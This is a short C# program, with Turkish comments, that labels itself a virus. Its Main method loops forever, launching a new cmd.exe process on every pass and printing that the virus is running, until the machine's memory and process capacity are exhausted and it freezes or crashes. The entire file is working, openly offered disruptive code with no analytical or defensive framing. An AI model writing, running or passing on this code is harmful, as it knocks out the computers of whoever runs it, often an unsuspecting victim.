using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics; //Uygulama erişimi için gerekli kütüphane
namespace Virus_1
{
    internal class Program
    {
        static void Main(string[] args)
        {
            //Uygulama erişimi ile virüs kodu çalıştırma
            //Sonsuz çalışması için while döngüsü
            while (true)
            {
             
                Process.Start("cmd.exe");
                Console.WriteLine("Virüs çalışıyor...");
            }
        }
    }
}
